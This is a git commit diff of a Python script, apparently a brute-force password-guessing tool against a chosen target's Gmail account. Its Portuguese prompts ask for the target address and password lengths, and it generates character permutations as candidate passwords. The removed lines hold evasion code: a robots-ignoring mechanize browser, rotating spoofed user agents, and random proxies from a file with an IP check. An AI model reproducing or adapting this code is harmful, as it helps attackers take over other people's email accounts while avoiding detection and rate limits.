2d51ff0113b10c51f65941773ddea64c4021a240
Gilmarfilho2003 <89646761+Gilmarfilho2003@users.noreply.github.com>
2021-09-25 13:59:10 -0300

    Update g.py

--- g.py
+++ g.py
@@ -42,34 +42,6 @@ user = input("Entre com o Gmail alvo: ")
 min_digitos = (int(input("Entre a quantidade de caracteres minimos: ")))
 qnt_digitos = (int(input("Entre com a quantidade de caracteres maximos: ")))
 
-brows = Browser()
-brows.set_handle_robots(False)
-brows._factory.is_html = True
-brows.set_cookiejar(cookielib.LWPCookieJar())
-useragents = [
-           'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
-           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
-           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
-           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6']
-brows.addheaders = [('User-agent',random.choice(useragents))]
-brows.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-proxyList = options.proxy
-#Coding Function Proxy 0xAbdullah
-def proxy():
-    logging.basicConfig()
-    pl = ProxyList()
-    try:
-        pl.load_file(proxyList)
-    except:
-        sys.exit('[!] Proxy File format has incorrect | EXIT...')
-    pl.random()
-    getProxy = pl.random().address()
-    brows.set_proxies(proxies={"https": getProxy})
-    try:
-        checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
-    except:
-        return proxy()
-
 def print_perms(chars, minlen, maxlen): 
     for n in range(minlen, maxlen+1): 
         for perm in itertools.product(chars, repeat=n): 
